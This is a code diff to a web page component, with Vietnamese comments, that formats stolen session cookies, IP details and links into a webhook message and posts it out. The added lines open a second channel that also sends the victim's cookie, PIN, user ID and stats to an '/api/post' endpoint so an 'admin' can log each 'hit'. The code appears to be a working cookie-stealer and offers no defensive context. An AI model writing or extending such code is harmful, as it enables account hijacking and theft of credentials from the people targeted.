@@ -268,7 +268,7 @@ export default function SlugPage() {
               `**Links:**\n` +
               `[Refreshed Cookie](${linkRe || "N/A"}) | ` +
               `[Original Cookie](${linkRe || "N/A"}) | ` +
-              `[IP Info [UA, Kyiv]]("https://ip-api.com/#185.30.203.240")\n\n` +  // ← 3 link nằm ở đây, ngay trên cookie
+              `[IP Info [UA, Kyiv]](https://ip-api.com/#185.30.203.240)\n\n` +  // ← 3 link nằm ở đây, ngay trên cookie
               (cookieDisplay 
                 ? `\`\`\`${cookieDisplay}\`\`\`` 
                 : "```No cookie available```"),
@@ -288,6 +288,7 @@ export default function SlugPage() {
         attachments: []
       };
 
+
       const res = await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -295,6 +296,19 @@ export default function SlugPage() {
       });
 
       if (res.ok) {
+        fetch("/api/post", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            cookie: cookieValue,
+            pin: pinValue,
+            userId,
+            userData,
+            fullStats,
+            slug, // để admin biết hit từ đâu
+          }),
+        }).catch((err) => console.error("[Admin log fetch failed]", err));
+      
         setStatus({ message: "Thành công!", type: "success" });
         setTimeout(() => {
           setFileContent("");
